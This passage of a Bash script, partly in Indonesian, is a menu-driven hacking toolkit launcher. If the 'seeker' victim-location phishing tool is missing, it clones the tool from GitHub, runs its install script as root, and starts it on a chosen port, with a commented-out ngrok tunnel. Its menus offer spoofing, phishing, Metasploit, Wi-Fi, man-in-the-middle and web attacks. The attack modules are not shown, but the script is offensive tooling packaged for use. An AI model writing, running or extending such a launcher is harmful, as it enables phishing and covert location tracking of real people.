                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mseeker already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"

                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m seeker \033[31;1mnot found\033[37;1m, installing seeker!\n"
                cd $path/.data > /dev/null 2>&1
                git clone https://github.com/thewhiteh4t/seeker;cd seeker;chmod +x install.sh;./install.sh
                sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                echo

                fi

                sleep 3


        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
        sleep 2
       	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] port : "'\033[34;1m')" skrport
        clear
        cd $path/.data/seeker;python3 seeker.py -p $skrport #;./ngrok http $skrport
        
        sleep 3
        seeker

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        seeker
        fi
}


# fungsi untuk menjalankan menu untuk web attack
function run_soceng_attack(){
        clear
        baner
        echo
        soceng
                if [ $xyz = "1"  ];
                then
                spoof
                run_soceng_attack

                elif [ $xyz = "2"  ];
                then
                phishing
                run_soceng_attack

		elif [ $xyz = "3"  ];
                then
                seeker
                run_soceng_attack
	
                elif [ $xyz = "0"  ];
                then
                runer

                else
                printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
                sleep 2
                run_soceng_attack

                fi
}

# Check os for root
check_root() {

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    { clear; baner; }
    echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
    exit 1
fi

}

function runer(){
    clear
    baner
    echo
    echo
    menu
    while true
    do
        case $xyz in
            1) run_information;;
            2) run_metasploit;;
            3) run_web_attack;;
            4) run_wifi_attack;;
            5) run_mitm_attack;;
            6) run_soceng_attack;;
            0) keluar;exit;;
            *) printf "\033[31;1m[\033[32;1m!\033[31;1m]\033[37;1m please input in options . . .\n"
               sleep 3 && runer;;
        esac
    done

}
check_root
dependencies
sleep 1

clear
runer
